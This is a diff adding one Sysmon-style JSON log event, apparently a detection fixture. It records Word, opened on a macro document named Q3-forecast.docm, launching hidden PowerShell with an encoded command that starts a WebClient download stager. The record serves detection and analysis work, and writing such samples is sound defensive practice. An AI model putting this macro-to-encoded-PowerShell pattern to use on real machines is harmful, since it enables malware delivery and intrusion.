@@ -1,0 +1,39 @@
+{
+  "@timestamp": "2026-09-20T18:04:51.221Z",
+  "event": {
+    "action": "process_start",
+    "category": "process",
+    "outcome": "success",
+    "dataset": "windows.sysmon"
+  },
+  "host": {
+    "name": "WKS-FIN-0117",
+    "os": {"family": "windows", "version": "11 23H2"},
+    "ip": ["10.14.44.19"]
+  },
+  "user": {
+    "name": "mharris",
+    "domain": "CORP"
+  },
+  "process": {
+    "name": "powershell.exe",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
+    "parent": {
+      "name": "winword.exe",
+      "command_line": "WINWORD.EXE /n"
+    },
+    "args": ["-NoP", "-NonI", "-W", "Hidden", "-Enc", "JABjAD0A..."]
+  },
+  "user_agent": {
+    "original": "n/a"
+  },
+  "file": {
+    "name": "Q3-forecast.docm",
+    "path": "C:\\Users\\mharris\\Downloads\\Q3-forecast.docm"
+  },
+  "winlog": {
+    "event_id": 1,
+    "provider_name": "Microsoft-Windows-Sysmon"
+  },
+  "message": "Encoded PowerShell spawned by WINWORD.EXE on WKS-FIN-0117."
+}
